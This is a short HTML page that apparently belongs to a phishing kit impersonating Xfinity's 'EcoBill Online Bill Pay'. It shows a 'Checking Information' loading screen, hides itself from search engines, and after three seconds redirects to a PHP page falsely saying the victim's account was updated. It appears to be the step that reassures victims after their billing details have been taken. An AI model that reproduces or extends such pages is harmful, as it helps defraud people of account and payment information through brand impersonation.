<!DOCTYPE html>
<html>
<head>
	<meta content="text/html; charset=utf-8" http-equiv="Content-Type">
	<meta content="ie=edge" http-equiv="x-ua-compatible">
	<meta content="width=device-width,initial-scale=1,shrink-to-fit=no" name="viewport">
	<title>XFINITY | Checking Information | EcoBill&reg; Online Bill Pay</title>
	<link href="./CSS/S.ico" rel="icon">
	<meta content="noindex" name="robots">
	<link href="./CSS/CC.css" rel="stylesheet">
	<meta content="3;URL=Thanks.php?Valid=Youraccount . Updated" http-equiv="refresh">
</head>
<body>
	<a class="xc-header--skip" id="xc-header--skip" name="xc-header--skip" tabindex="0"></a>
	<div class="page-app__wrapper">
		<div>
			<section class="page-section ui-grey page-section--loading" style=""></section>
			<div class="page-section__wrapper clearfix">
				<div class="page-section__content">
					<div class="loading">
						<div class="loading__content">
							<div class="loading__dots">
								<div class="loading__dot"></div>
								<div class="loading__dot"></div>
								<div class="loading__dot"></div>
							</div>
						</div>
					</div>
				</div>
			</div>
		</div>
	</div>
</body>
</html>